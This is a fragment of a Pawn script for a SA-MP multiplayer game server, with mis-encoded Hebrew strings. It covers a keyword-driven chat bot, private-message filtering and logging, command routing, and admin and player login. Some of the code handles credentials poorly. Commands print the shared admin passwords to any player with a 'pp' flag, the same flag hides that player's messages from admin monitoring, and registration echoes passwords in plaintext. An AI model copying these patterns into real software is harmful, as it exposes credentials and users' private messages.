				else SendPlayerMessageToPlayer(i,playerid,stringwithid);
			}
		}
	}
	if(equal(text,replytest))
	{
		SendClientMessage(playerid,green," !äè÷ñè ùä÷ìãú ùååä ìè÷ñè ùðéúï áîáçï äçæøä");
		new pay = replytestlevel * 5000;
		format(string,sizeof(string)," !äöìéç ìçæåø òì äè÷ñè äëé îäø åæëä á %d$ %s",pay,GetName(playerid));
		SendClientMessageToAll(green,string);
		GiveMoney(playerid,pay);
		format(replytest,sizeof(replytest),"");
		replytestlevel = 0;
	}
	dbg(8,"8");
	if(boton && botwrite)
	{
		#define f(%1) strfind(text,%1,true) != -1
		if(f("ôåøåí") && f("îä") && f("ëúåáú"))
		{
			format(string,sizeof(string)," %s :ëúåáú äôåøåí ùìðå äéà",webpage);
			return BotSay(playerid,string);
		}
		if(f("òæøä") && f("àðé") && f("öøéê")) return BotSay(playerid," /help :ìòæøä, øùåí àú äô÷åãä");
		if(f("îé") && f("?") && (f("îúëðú") || f("áðä") || f("òùä") || f("éöø")) && (f("îåã") || f("ùøú") || f("îòøëú"))) return BotSay(playerid," /help credits :ìøùéîú éåöøé äîåã");
		if(f("ååðè") && f("îä"))
		{
			format(string,sizeof(string)," %s:%s :ëúåáú ùøú äååðèøéìå ùìðå äéà",ventip,ventport);
			return BotSay(playerid,string);
		}
		if(f("àãîéï") && f("îé") && f("?")) return BotSay(playerid," /admins :ìöôééä áøùéîú äàãîéðéí äîçåáøéí");
		if(f("ö'éèø") || f("äà÷") || f("öéèø")) return BotSay(playerid," /report [id] [reason] :ðà ìà ìãååç òì ö'éèøéí áö'àè. äùúîùå áô÷åãä");
		if((bottalkingto[0] == playerid || f(botname)) && f("îä") && (f("îöá") || f("÷åøä") || f("ðùîò")))
		{
			new wassupHE[][256 char] =
			{
				" (: ?%s àðé îøâéù îöåééï. îä àéúê",
				" ^^ ?äëì èåá, %s. îä àéúê",
				" ?àðé áñãø, %s. îä àéúê",
				" ?úåãä ùùàìú, %s. äëì áñãø àöìé. îä àéúê",
				" ?%s, äëì áñãø =] îä àéúê"
			};
			new wassupEN[][256 char] =
			{
				" (: ?àðé îøâéù îöåééï. îä àéúê %s",
				" ^^ ?îä àéúê .%s ,äëì èåá",
				" ?îä àéúê ,%s àðé áñãø",
				" ?äëì áñãø àöìé. îä àéúê .%s ,úåãä ùùàìú",
				" ?äëì áñãø =] îä àéúê ,%s"
			};
			if(bottalkingto[0] != INVALID_PLAYER_ID || bottalkingto[1] != INVALID_PLAYER_ID) KillTimer(bottalkingto[2]);
			bottalkingto[0] = playerid, bottalkingto[1] = playerid, bottalkingto[2] = SetTimer("BotStopTalkingTo",30000,0);
			format(string,sizeof(string),playerinfo[playerid][rname]);
			format(string,sizeof(string),equal(string,"no") || !strlen(string) ? (wassupEN[random(sizeof(wassupEN))]) : (wassupHE[random(sizeof(wassupHE))]),equal(string,"no") || !strlen(string) ? (GetName(playerid)) : (string));
			return BotSay(playerid,string,true);
		}
		if(bottalkingto[1] == playerid && (f("áñãø") || f("îöåééï") || f("èåá") || f("àçìä")))
		{
			new imhappy[][256 char] =
			{
				" .ùîç ìùîåò",
				" .èåá ìãòú",
				" [= àçìä"
			};
			bottalkingto[1] = INVALID_PLAYER_ID;
			KillTimer(bottalkingto[2]);
			return BotSay(playerid,imhappy[random(sizeof(imhappy))]);
		}
		if(f(botname) && (f("ùúå÷") || f("ù÷è") || f("shut up") || f("ñúåí") || f("ùúò÷")))
		{
			new stfu[][256 char] =
			{
				" .ðà ìà ìäùúé÷ àåúé",
				" (: ùúå÷ àúä",
				" .ìà",
				" .ìà øåöä",
				" .àðé éãååç òìéê ìòîéú",
				" !ìà"
			};
			if(playerinfo[playerid][angry][0] < sizeof(stfu)) playerinfo[playerid][angry][0]++;
			if(playerinfo[playerid][angry][0] == sizeof(stfu)-1)
			{
				format(string,sizeof(string)," !áâìì ùðéñä ìäùúé÷ àåúå %s îîù ëåòñ òì ,%s ,ðøàä ëé äáåè ùìðå",GetName(playerid),botname);
				News(string);
			}
			return BotSay(playerid,playerinfo[playerid][angry][0] >= sizeof(stfu)-1? (stfu[random(sizeof(stfu))]):(stfu[playerinfo[playerid][angry][0]]));
		}
		if(f(botname) && f("àúä") && f("çééì") && f("òîéú") && strcount(text," ") <= 5) return BotSay(playerid," !ëï");
		if(f(botname) && f("àúä") && f("îé") && f("?")) return BotSay(playerid," .àðé äáåè ùì äùøú, îùúîù ùòåæø ìùç÷ðéí åùåîø òì äùøú");
		if((f("àéê") || f("ëéöã")) && f("ëñó") && (f("ìäùéâ") || f("ì÷áì") || f("ìäøååéç") || f("ìòùåú"))) return BotSay(playerid," /moneyhelp :ìòæøä òí ëñó äùúîùå áô÷åãä");
		if((f("àéê") || f("ëéöã") || f("àéôä") || f("äéëï")) && f("ðù÷éí") && (f("ìäùéâ") || f("÷åðéí") || f("ì÷ðåú"))) return BotSay(playerid," /ammuhelp :ìòæøä òí ðù÷éí äùúîùå áô÷åãä");
		if((f("àéê") || f("ëéöã")) && (f("áéú") || f("áúéí")) && (f("ì÷ðåú") || f("÷åðéí"))) return BotSay(playerid," /houseshelp :ìòæøä òí áúéí äùúîùå áô÷åãä");
		if((f("àéê") || f("ëéöã")) && (f("òåìéí") || f("ìòìåú")) && f("øîä")) return BotSay(playerid," .ëãé ìøàåú àú ôøèé äøîä äáàä ùìê /level ëãé ìòìåú øîä åáô÷åãä /buylevel äùúîù áô÷åãä");
		if(f("ùéâåøéí") && (f("àéæä") || f("îä"))) return BotSay(playerid," /teleports :øùéîú äùéâåøéí îåöâú áô÷åãä");
		if((f("àéôä") || f("äéëï")) && f("çðåú") && f("ðù÷éí")) return BotSay(playerid," /race ìéã äùéâåø");
		if((f("àéôä") || f("äéëï")) && f("áð÷")) return BotSay(playerid," /lv ìéã äùéâåø");
		if(f("àéê") && f("ùåìçéí") && (f("pm") || f("ä\"ô") || f("ä.ô") || (f("ôøèéú") && f("ä.")) || (f("äåãòä") && f("ôøèéú")))) return BotSay(playerid," /pm [id] [text] :äùúîùå áô÷åãä");
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("îéøåõ") || f("îøåõ"))) return BotSay(playerid,raceinfo[0]? (" /racing join :îöèøôéí ìîéøåõ áàîöòåú äô÷åãä") : (" .àéï îéøåõ ëøâò"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("îìçîä") || f("war"))) return BotSay(playerid,warinfo[0]? (" /racing join :îöèøôéí ìîìçîä áàîöòåú äô÷åãä") : (" .àéï îìçîä ëøâò"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && f("wwe")) return BotSay(playerid,wweinfo[0]? (" /racing join :îöèøôéí ìîéøåõ áàîöòåú äô÷åãä") : (" .ëøâò WWE àéï"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("kart") || f("÷øè") || f("÷øú") || f("÷àøè") || f("÷àøú"))) return BotSay(playerid,kartinfo[0]? (" /kart join :áàîöòåú äô÷åãä Kart îöèøôéí ìúçøåú ä") : (" .ëøâò Kart àéï úçøåú"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("monster") || f("îåðñèø") || f("îåðñúø"))) return BotSay(playerid,monsterinfo[0]? (" /monster join :áàîöòåú äô÷åãä Monster îöèøôéí ìúçøåú ä") : (" .ëøâò Monster àéï úçøåú"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("îéøåõ îéåçã") || f("îøåõ îéåçã"))) return BotSay(playerid,sraceinfo[0]? (" /srace join :îöèøôéí ìîéøåõ äîéåçã áàîöòåú äô÷åãä") : (" .àéï îéøåõ îéåçã ëøâò"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("kickstar") || f("÷é÷ñèø"))) return BotSay(playerid,monsterinfo[0]? (" /monster join :áàîöòåú äô÷åãä Monster îöèøôéí ìúçøåú ä") : (" .ëøâò Monster àéï úçøåú"));
		if(f("àéê") && (f("îöèøôéí") || f("îéöèøôéí") || f("îöúøôéí") || f("îéöúøôéí")) && (f("ì÷ìàï") || f("ì÷ìï"))) return BotSay(playerid," /clan accept :îöèøôéí ì÷ìàï áàîöòåú äô÷åãä");
		if(f("àéê") && (f("éåöàéí") || f("ìöàú")) && (f("DM") || f("ãéàí") || f("ãéàî") || f("ãé-àí") || f("ãé-àî"))) return BotSay(playerid," /qdmz :ëãé ìöàú îàæåø ãé-àí");
		if(f("àéê") && (f("ùåîøéí") || f("ìùîåø")) && (f("ñ÷éï") || f("ãîåú") || f("÷ìàñ"))) return BotSay(playerid," /skinsave :ìùîéøú ñ÷éï äùúîù áô÷åãä");
		if(f("àéê") && (f("îåç÷éí") || f("ìîçå÷")) && (f("ñ÷éï") || f("ãîåú") || f("÷ìàñ"))) return BotSay(playerid," /delsave :ìîçé÷ú ñ÷éï äùúîù áô÷åãä");
		if(f("ëîä") && (f("ùç÷ðéí") || f("îùúîùéí")) && (f("îçåáøéí") || (f("éù") && f("áùøú"))) && (f("ëøâò") && f("òëùéå")))
		{
			new op = 0;
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) op++;
			format(string,sizeof(string)," .îñôø äùç÷ðéí äîçåáøéí ëøâò ìùøú äåà %d",op);
			return BotSay(playerid,string);
		}
		if(f("áàï") && f("àãîéï") && (f("úåøéã") || f("ìäåøéã") || f("îç÷")))
		{
			format(string,sizeof(string)," %s :äåøãú áàðéí îúáöòú ãøê ôåøåí îùåá åòæøä áàúøéðå",webpage);
			return BotSay(playerid,string);
		}
		if((f("ùìåí") || f("äéé") || f("àäìï")) && (f("ëåìí") || f("àðùéí") || f("çáøéí") || f("çáøä") || f("çáø'ä"))) return BotSay(playerid," .ùìåí åáøëä");
		if((f("îä") && f("òåùéí")) || f("îä") && f("öøéê") && f("ìòùåú")) return BotSay(playerid," /help objective :äùúîùå áô÷åãä äáàä òì îðú ì÷øåà òì äîùéîä áîåã æä");
		if(f("îä ä") && (f("ùòä") || f("úàøéê"))) return BotSay(playerid," .òì îðú ìøàåú àú äùòä åäúàøéê /td äùúîù áô÷åãä");
		if(f(botname) && f(":") && !(f("]") || f("[") || f(")") || f(")") || f("D"))) return BotSay(playerid," .ðà ìà ìçëåú àåúé");
		if(f(botname) && (f("éà") || f(" ä")) && (f("îôâø") || f("àéãéåè") || f("îèåîèí") || f("èéôù")))
		{
			new curseEN[][256 char] =
			{
				" !î÷ìì àåúé %s !àãîéï",
				" .%s îñôé÷",
				" .%s ãé ì÷ìì àåúé",
				" .àðé çåùá ùàúä èîáì ,%s",
				" .%s ãé ìäöé÷ ìé"
			}, curseHE[][256 char] =
			{
				" !àãîéï! %s î÷ìì àåúé",
				" .îñôé÷ %s",
				" .ãé ì÷ìì àåúé %s",
				" .%s, àðé çåùá ùàúä èîáì",
				" .ãé ìäöé÷ ìé %s"
			};
			format(string,sizeof(string),playerinfo[playerid][rname]);
			return BotSay(playerid,strlen(string) > 0 ? curseHE[random(sizeof(curseHE))] : curseEN[random(sizeof(curseEN))]);
		}
		if((bottalkingto[0] == playerid || f(botname)) && f("ëñó") && f("áá÷ùä") && (f("àôùø") || f("øåöä") && f("àðé")))
		{
			if(playerinfo[playerid][pleasemoney])
			{
				new dgive[][256 char] =
				{
					" .ëáø äáàúé ìê",
					" .àéï ìé òåã áùáéìê",
					" .úåëì ì÷áì òåã ø÷ àçøé ùúöà",
					" /workhelp !úîöà òáåãä",
					" !?àúä çåùá ùëñó âãì òì äòöéí"
				};
				if(playerinfo[playerid][angry][1] < sizeof(dgive)) playerinfo[playerid][angry][1]++;
				if(playerinfo[playerid][angry][1] == sizeof(dgive)-1)
				{
					format(string,sizeof(string)," !áâìì ùáé÷ù äøáä ëñó %s îîù ëåòñ òì ,%s ,ðøàä ëé äáåè ùìðå",GetName(playerid),botname);
					News(string);
				}
				return BotSay(playerid,playerinfo[playerid][angry][1] >= sizeof(dgive)-1? (dgive[random(sizeof(dgive))]):(dgive[playerinfo[playerid][angry][1]]));
			}
			else
			{
				new amounts[] =
				{
					1,
					50,		50,		50,		50,
					100,	100,	100,
					500,	500,
					1000,   1000,
					2500,
					5000
				};
				new giveMoney = amounts[random(sizeof(amounts))];
				playerinfo[playerid][pleasemoney] = 1;
				GiveMoney(playerid,giveMoney);
				format(string,sizeof(string)," (: .÷éáìú %d$, úäðä",giveMoney);
				if(giveMoney < 100) News(" !áåè ÷îöï ðîöà áùøú");
				return BotSay(playerid,string);
			}
		}
		if((bottalkingto[0] == playerid || f(botname)) && (f("ùìê") || f("ùê") || f("ù'ê")) && (f("òøå") || f("ñúå") || f("âîå")))
		{
			new mama[][256 char] =
			{
				" .ùúå÷",
				" .ìà ðøàä ìé"
			};
			return BotSay(playerid,mama[random(sizeof(mama))],true);
		}
		if(f(botname))
		{
			new what[][256 char] =
			{
				" ?ëï",
				" ?",
				" ?îä",
				" Yes?"
			};
			if(bottalkingto[0] != INVALID_PLAYER_ID || bottalkingto[1] != INVALID_PLAYER_ID) KillTimer(bottalkingto[2]);
			bottalkingto[0] = playerid, bottalkingto[2] = SetTimer("BotStopTalkingTo",30000,0);
			return BotSay(playerid,what[random(sizeof(what))],true);
		}
		#undef f
	}
	dbg(8,"9");
	SetString(playerinfo[playerid][lasttext],text);
	dbg(8,"10");
	if(debugstate) printf("OnPlayerText(%s(%d),%s) end",GetName(playerid),playerid,text);
	return 0;
}
/*//=[OnPlayerPrivmsg]============================================================
public OnPlayerPrivmsg(playerid, recieverid, text[])
{
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) start",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	SendClientMessage(playerid,red," (SA-MP æîðé, òã ùúöà äâøñä ä 0.3 ùì) /p :ìùìéçú äåãòä ôøèéú äùúîù áô÷åãä");
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) end",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	return 0;
} Removed on SA-MP 0.3 */
//=[OnPlayerPrivmsg]============================================================
public OnPlayerPrivmsg(playerid, recieverid, text[])
{
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) start",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	new string[M_S];
	format(string,sizeof(string)," to (%d)%s: %s",recieverid,GetName(recieverid),text);
	Log("PMs",playerid,string);
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged])
	{
		SendClientMessage(playerid,red," /login :ìà ðéúï ìùìåç äåãòåú ôøèéåú ìôðé ùäúçáøú. ìäúçáøåú");
		return 0;
	}
	if(IsPlayerMAdmin(playerid) || IsPlayerMAdmin(recieverid))
	{
		format(string,sizeof(string),"[PM] %s (%d) to %s (%d): %s",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][mss] && !IsPlayerMAdmin(i))) SendClientMessage(i,0xF7A26FFF,string);
	}
	if(playerinfo[playerid][nopm])
	{
		SendClientMessage(playerid,red," .àéðê îåøùä ìëúåá äåãòåú ôøèéåú");
		return 0;
	}
	dbg(9,"1");
	new bool:m=false;
	for(new s=0;s<words_count;s++)
	{
		new pos;
		while((pos = strfind(text,words[s],true)) != -1) for(new i=pos, j=pos+strlen(words[s]);i<j;i++) text[i] = '*', m = true;
	}
	if(advertisement(text) && (strfind(text,"..",true) == -1))
	{
		SendClientMessage(playerid,red," .äîòøëú æéäúä ôøñåí åìëï ääåãòä ìà ðùìçä");
		format(string,sizeof(string)," (/b áàï îäéø) :%s - æåää ôøñåí áäåãòä ôøèéú îàééãé %d",GetName(playerid),playerid);
		lastAdv = playerid;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerMAdmin(i))
			{
				SendClientMessage(i,blue,"----------");
				SendClientMessage(i,red,string);
				SendClientMessage(i,red,text);
				SendClientMessage(i,blue,"----------");
			}
		}
		return 0;
	}
	dbg(9,"2");
	if(!IsPlayerMAdmin(playerid) && m)
	{
		playerinfo[playerid][mtime] += 30;
		playerinfo[playerid][mute][0] = playerinfo[playerid][mtime];
		playerinfo[playerid][mute][1] = SetTimerEx("UnMute",1000,1,"d",playerid);
		format(string,sizeof(string)," .äåùú÷ú ì %d îäñéáä ù÷éììú áôøèé",playerinfo[playerid][mtime]);
		SendClientMessage(playerid,red,string);
	}
	if(equal(playerinfo[playerid][lastpmtext],text))
	{
		SendClientMessage(playerid,red," !ìà ìäöéó");
		return 0;
	}
	SetString(playerinfo[playerid][lastpmtext],text);
	if(playerinfo[recieverid][ignore][playerid])
	{
		SendClientMessage(playerid,red," .äùç÷ï àìéå ðéñéú ìùìåç äåãòä ôøèéú çñí àåúê");
		return 0;
	}
	if(playerinfo[recieverid][blockpms])
	{
		SendClientMessage(playerid,red," .äùç÷ï àìéå ðéñéú ìùìåç äåãòä ôøèéú àéðå î÷áì äåãòåú ôøèéåú");
		return 0;
	}
	playerinfo[playerid][flood][1]++;
	if(playerinfo[playerid][flood][1] >= 2 && !IsPlayerMAdmin(playerid))
	{
		playerinfo[playerid][fwarns][1]++;
		format(string,sizeof(string)," !ìà ìäöéó áôøèé - àæäøä îñôø %d îúåê 5",playerinfo[playerid][fwarns][1]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][1] >= 5) SetKick(playerid,INVALID_PLAYER_ID,"äöôä áôøèé");
		return 0;
	}
	dbg(9,"3");
	/*if(playerinfo[playerid][savepms])
	{
		new f[M_S], k[M_S], bool:pmWritten = false;
		format(f,sizeof(f),"%sPMList_%s",folder_infopm,GetName(playerid));
		if(!fexist(f)) fcreate(f);
		for(new i = 0; i < 50; i++)
		{
			format(k,sizeof(k),"PM%d",i);
			if(fkeyexist(f,k)) continue;
			format(string,sizeof(string),"[%s] Sent to %s: %s",GetDateAsString(),GetName(recieverid),text);
			fsetstring(f,k,string);
			pmWritten = true;
			break;
		}
		if(!pmWritten) return SendClientMessage(playerid,red," .úéáú ääåãòåú äôøèéåú ùìê îìàä, àðà øå÷ï àåúä");
	}
	dbg(9,"4");
	if(playerinfo[recieverid][savepms])
	{
		new f[M_S], k[M_S], bool:pmWritten = false;
		format(f,sizeof(f),"%sPMList_%s",folder_infopm,GetName(recieverid));
		if(!fexist(f)) fcreate(f);
		for(new i = 0; i < 50; i++)
		{
			format(k,sizeof(k),"PM%d",i);
			if(fkeyexist(f,k)) continue;
			format(string,sizeof(string),"[%s] From %s: %s",GetDateAsString(),GetName(playerid),text);
			fsetstring(f,k,string);
			pmWritten = true;
			break;
		}
		if(!pmWritten) return SendClientMessage(recieverid,red," .úéáú ääåãòåú äôøèéåú ùìê îìàä, àðà øå÷ï àåúä");
	}*/
	dbg(9,"5");
	new pmstring[256];
	format(pmstring,sizeof(pmstring),"[PM] %s(%d) to %s(%d): %s",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	if(!playerinfo[playerid][pp]) for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] > playerinfo[playerid][admin] && playerinfo[i][admin] > playerinfo[recieverid][admin] && playerinfo[i][togpm]) SendClientMessage(i,0x24FF0AB9,pmstring);
	dbg(9,"6");
	if(debugstate) printf("OnPlayerPrivmsg(%s(%d),%s(%d),%s) end",GetName(playerid),playerid,GetName(recieverid),recieverid,text);
	return 1;
}
//=[OnPlayerCommandText]========================================================
public OnPlayerCommandText(playerid, cmdtext[])
{
	if(debugstate) printf("OnPlayerCommandText(%s(%d),%s)",GetName(playerid),playerid,cmdtext);
	if(!IsPlayerConnected(playerid) && playerid != MAX_PLAYERS) return 1;
	Log("Commands",playerid,cmdtext);
	if(playerinfo[playerid][nocmd]) return SendClientMessage(playerid,red," .àéðê îåøùä ìëúåá ô÷åãåú");
	if((playerinfo[playerid][jail][0] > 0 || playerinfo[playerid][mute][0] > 0 || playerinfo[playerid][xjail]) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ìà ðéúï ìëúåá ô÷åãåú ëàùø àúä áäùú÷ä àå áëìà");
	playerinfo[playerid][flood][2]++;
	if(playerinfo[playerid][flood][2] >= 3 && !IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		playerinfo[playerid][fwarns][2]++;
		format(string,sizeof(string)," !ìà ìäöéó áô÷åãåú - àæäøä îñôø %d îúåê 5",playerinfo[playerid][fwarns][2]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][2] >= 5) SetKick(playerid,INVALID_PLAYER_ID,"äöôä áô÷åãåú");
		return 1;
	}
	new cmd[256], idx, cmdstring[M_S], bool:validcmd = true;
	cmd = strtok(cmdtext,idx);
	if(IsPlayerNotAllowedToUseCommand(playerid,cmd,cmdtext)) return SendClientMessage(playerid,red," .äàôùøåú ìáéöåò ô÷åãä æå çñåîä àöìê");
	if(equal(cmd,"/pm")) playerinfo[playerid][dscmd] = 1;
	if(equal(cmdtext,"/teleports") || equal(cmdtext,"/t")) return command(playerid,"/help mode 1");
	if(equal(cmdtext,"/bankhelp")) return command(playerid,"/help mode 2");
	if(equal(cmdtext,"/levelhelp")) return command(playerid,"/help mode 3");
	if(equal(cmdtext,"/ammuhelp")) return command(playerid,"/help mode 4");
	if(equal(cmdtext,"/money")) return command(playerid,"/help mode 5");
	if(equal(cmdtext,"/wanghelp")) return command(playerid,"/help mode 6");
	if(equal(cmdtext,"/prophelp")) return command(playerid,"/help mode 7");
	if(equal(cmdtext,"/racehelp")) return command(playerid,"/help mode 8");
	if(equal(cmdtext,"/swarhelp")) return command(playerid,"/help mode 9");
	if(equal(cmdtext,"/workhelp")) return command(playerid,"/help mode 10");
	if(equal(cmdtext,"/vehiclehelp")) return command(playerid,"/help mode 11");
	if(equal(cmdtext,"/stunt")) return command(playerid,"/help mode 12");
	if(equal(cmdtext,"/wwehelp")) return command(playerid,"/help mode 13");
	if(equal(cmdtext,"/lottohelp")) return command(playerid,"/help mode 14");
	if(equal(cmdtext,"/dmhelp")) return command(playerid,"/help mode 15");
	if(equal(cmdtext,"/pethelp")) return command(playerid,"/help mode 16");
	if(equal(cmdtext,"/bbhelp")) return command(playerid,"/help mode 17");
	if(equal(cmdtext,"/drifthelp")) return command(playerid,"/help mode 18");
	if(equal(cmdtext,"/pbattlehelp")) return command(playerid,"/help mode 19");
	if(equal(cmdtext,"/sammuhelp")) return command(playerid,"/help mode 20");
	if(equal(cmdtext,"/aahelp")) return command(playerid,"/help mode 21");
	if(equal(cmdtext,"/bonushelp")) return command(playerid,"/help mode 22");
	if(equal(cmdtext,"/gamblinghelp")) return command(playerid,"/help mode 23");
	if(equal(cmdtext,"/ganghelp")) return command(playerid,"/help mode 24");
	if(equal(cmdtext,"/accounthelp")) return command(playerid,"/help mode 25");
	if(equal(cmdtext,"/clanhelp")) return command(playerid,"/help mode 26");
	if(equal(cmdtext,"/achelp")) return command(playerid,"/help mode 27");
	if(equal(cmdtext,"/wlhelp")) return command(playerid,"/help mode 28");
	if(equal(cmdtext,"/phonehelp")) return command(playerid,"/help mode 29");
	if(equal(cmdtext,"/karthelp")) return command(playerid,"/help mode 30");
	if(equal(cmdtext,"/monsterhelp")) return command(playerid,"/help mode 31");
	if(equal(cmdtext,"/viphelp")) return command(playerid,"/help mode 32");
	if(equal(cmdtext,"/bothelp")) return command(playerid,"/help mode 33");
	if(equal(cmdtext,"/sracehelp")) return command(playerid,"/help mode 34");
	if(equal(cmdtext,"/hitmanhelp")) return command(playerid,"/help mode 35");
	if(equal(cmdtext,"/bombshelp")) return command(playerid,"/help mode 36");
	if(equal(cmdtext,"/clothesshop")) return command(playerid,"/help mode 37");
	if(equal(cmdtext,"/houseshelp")) return command(playerid,"/help mode 38");
	if(equal(cmdtext,"/mathhelp")) return command(playerid,"/help mode 39");
	if(equal(cmdtext,"/triviahelp")) return command(playerid,"/help mode 40");
	if(equal(cmdtext,"/contact")) return command(playerid,"/help mode 41");
	if(equal(cmdtext,"/superbonuses")) return command(playerid,"/help mode 42");
	if(equal(cmdtext,"/pmhelp")) return command(playerid,"/help mode 43");
	if(equal(cmdtext,"/kshelp")) return command(playerid,"/help mode 44");
	if(equal(cmdtext,"/cranehelp")) return command(playerid,"/help mode 45");
	if(equal(cmdtext,"/colorhelp")) return command(playerid,"/help mode 46");
	if(equal(cmdtext,"/replytest")) return command(playerid,"/help mode 47");
	if(equal(cmdtext,"/npcs")) return command(playerid,"/help mode 48");
	if(equal(cmdtext,"/barhelp")) return command(playerid,"/help mode 49");
	if(equal(cmdtext,"/codeshelp")) return command(playerid,"/help mode 50");
	if(equal(cmdtext,"/objective")) return command(playerid,"/help objective");
	if(equal(cmdtext,"/tips")) return command(playerid,"/help tips");
	if(equal(cmdtext,"/commands") || equal(cmdtext,"/cmds") || equal(cmdtext,"/cmdlist")) return command(playerid,"/help commands");
	if(equal(cmdtext,"/rules")) return command(playerid,"/help rules");
	if(equal(cmdtext,"/credits")) return command(playerid,"/help credits");
	if(equal(cmdtext,"/saveskin")) return command(playerid,"/editprofile skin save");
	if(equal(cmdtext,"/delskin")) return command(playerid,"/editprofile skin save");
	if(IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		format(string,sizeof(string)," [CMD] %s /%s",GetName(playerid),cmdtext);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][mss] && !IsPlayerMAdmin(i))) SendClientMessage(i,0xF7A26FFF,string);
	}
	if(equal(cmd,"/admlog") && fkeyexist(file_admins,GetName(playerid)))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäúçáø ìîùúîù ùìê ÷åãí");
		if(playerinfo[playerid][admlog] == 2) return SendClientMessage(playerid,red," .àúä ëáø îçåáø ìàãîéï îåã");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /admlog [password] :öåøú äùéîåù");
		new a = fgetint(file_admins,GetName(playerid));
		if((equal(cmd,fgetstring(file_admins,"#AdminPassword")) && a <= 14) || (equal(cmd,fgetstring(file_admins,"#HighAdminPassword")) && a >= 15))
		{
		    SendClientMessage(playerid,green," .äúçáøú áäöìçä ìàãîéï îåã");
			playerinfo[playerid][admlog] = 2, playerinfo[playerid][admin] = a;
			SetFreeze(playerid,0);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else
		{
			fsetstring(fuser(playerid),"LastConnectIP","Waiting");
		    SendClientMessage(playerid,red," BB ,ñéñîà ùâåéä");
		    Kick(playerid);
		}
	    return 1;
	}
	if(equal(cmd,"/admlogp") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,fgetstring(file_admins,"#AdminPassword"));
	if(equal(cmd,"/admlogh") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,fgetstring(file_admins,"#HighAdminPassword"));
	if(!playerinfo[playerid][admlog] && fkeyexist(file_admins,GetName(playerid))) return SendClientMessage(playerid,red," /admlog [password] :àðà äúçáø");
	if(equal(cmd,"/register"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .àúä ëáø îçåáø");
		if(fexist(fuser(playerid))) return SendClientMessage(playerid,red," .äëéðåé ùìê ëáø øùåí, àðà äúçáø àå äçìó ëéðåé");
		if(!strlen(pass)) return SendClientMessage(playerid,white," /register [password] :öåøú äùéîåù");
		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì ìôçåú 3 úåéí");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì òã 15 úåéí");
		playerinfo[playerid][logged] = 1, playerinfo[playerid][level] = !playerinfo[playerid][level]? 1:playerinfo[playerid][level];
		SendClientMessage(playerid,grey," ...àðà äîúï");
		RegisterPlayer(playerid,Encrypt(pass));
		format(string,sizeof(string),"!ääøùîä äåùìîä áäöìçä\n%s :ùí îùúîù\n%s :ñéñîà\n.òì îðú ì÷áì òæøä ìâáé îòøëú äîùúîùéí /accounthelp äùúîù áô÷åãä\n/editprofile ìòøéëú äôøåôéì ùìê äùúîù áô÷åãä",GetName(playerid),pass);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äøùîä",string,"OK","");
		SendClientMessage(playerid,lightblue," --- !ðøùîú áäöìçä");
		format(string,sizeof(string)," %s :ùí îùúîù",GetName(playerid));
		SendClientMessage(playerid,orange,string);
		format(string,sizeof(string)," %s :ñéñîà",pass);
		SendClientMessage(playerid,orange,string);
		SendClientMessage(playerid,orange," /accounthelp :ìîéãò òì çùáåðåú äîùúîùéí");
		SendClientMessage(playerid,orange," /editprofile :ìòøéëú äôøåôéì");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/login"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .àúä ëáø îçåáø");
		if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .äëéðåé ùìê ìà øùåí áîòøëú, àðà áãå÷ ùìà èòéú áëúéáúå àå äøùí");
		if(!strlen(pass)) return SendClientMessage(playerid,white," /login [password] :öåøú äùéîåù");
